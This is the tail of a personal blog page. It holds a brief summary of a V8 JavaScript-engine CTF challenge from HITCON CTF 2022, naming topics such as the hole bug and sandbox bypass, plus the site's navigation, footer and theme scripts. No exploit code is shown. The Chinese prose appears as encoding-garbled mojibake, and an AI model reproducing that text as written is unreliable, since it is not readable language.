<hr>
<p><strong>Â∞èÁªìÔºö</strong></p>
<p>Êú¨‰∫∫ÂØπ V8 ‰∏çÊòØÂæà‰∫ÜËß£ÔºåÂè™ÊòØ‰πãÂâçÂ§çÁé∞Ëøá‰∏Ä‰∫õ JavaScript pwn</p>
<p>ÊØîËµõÊó∂ V8 ÁöÑÁéØÂ¢ÉÊàëÊê≠‰∫ÜÂæà‰πÖÔºåÊê≠Â•ΩÂêé‰πü‰∏ç‰ºöÂÅöÈ¢òÔºåËøô‰∏™È¢òÂ∞±ÂΩìÊòØ V8 ÂÖ•Èó®Âêß</p>
<p>ÂÖ®Á®ãÊ®°‰ªøÂÆòÊñπ wpÔºåÂéüÊñáÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://chovid99.github.io/posts/hitcon-ctf-2022/#the-corrupted-maps-impact">HITCON CTF 2022 | Welcome to Chovid99‚Äôs Blog</a></li>
</ul>
<p>ÊñáÁ´†ÂÖ®Ëã±ÊñáÔºåÈîªÁÇº‰∫Ü‰∏Ä‰∏ãÈòÖËØªËã±ËØ≠ËÆ∫ÊñáÁöÑËÉΩÂäõ</p>
<p>Â≠¶‰π†Âà∞ÁöÑÁü•ËØÜÂ¶Ç‰∏ãÔºö</p>
<ul>
<li><p>JS ÂØπË±°ÂÜÖÂ≠ò‰ø°ÊÅØÂ∏ÉÂ±Ä</p>
</li>
<li><p>JavaScript Hole ÊºèÊ¥û</p>
</li>
<li><p>Tagged Pointer</p>
</li>
<li><p>JavaScript Sandbox ‰ª•ÂèäÂÖ∂ÁªïËøáÊâãÊ≥ï</p>
</li>
<li><p>Map ÂØπË±°ÂéüÁêÜ‰ª•Âèä OrderedHashMap </p>
</li>
<li><p>V8 ÁöÑÁºñËØë‰ª•ÂèäË∞ÉËØïÊâãÊ≥ï</p>
</li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/V8/" rel="tag"><i class="fa fa-tag"></i> V8</a>
              <a href="/tags/javascript-pwn/" rel="tag"><i class="fa fa-tag"></i> javascript pwn</a>
              <a href="/tags/OOB/" rel="tag"><i class="fa fa-tag"></i> OOB</a>
              <a href="/tags/hole-attack/" rel="tag"><i class="fa fa-tag"></i> hole attack</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/11/27/Kernel%20%E7%8E%B0%E5%AE%9E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9ADirty%20Pipe/" rel="prev" title="Kernel Áé∞ÂÆûÊºèÊ¥ûÂ§çÁé∞ÔºöDirty Pipe">
      <i class="fa fa-chevron-left"></i> Kernel Áé∞ÂÆûÊºèÊ¥ûÂ§çÁé∞ÔºöDirty Pipe
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/12/05/VM%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8A%80%E6%9C%AF%E7%AE%80%E6%9E%90/" rel="next" title="VMËôöÊãüÊú∫ÊäÄÊúØÁÆÄÊûê">
      VMËôöÊãüÊú∫ÊäÄÊúØÁÆÄÊûê <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">332</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 ‚Äì 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:53</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
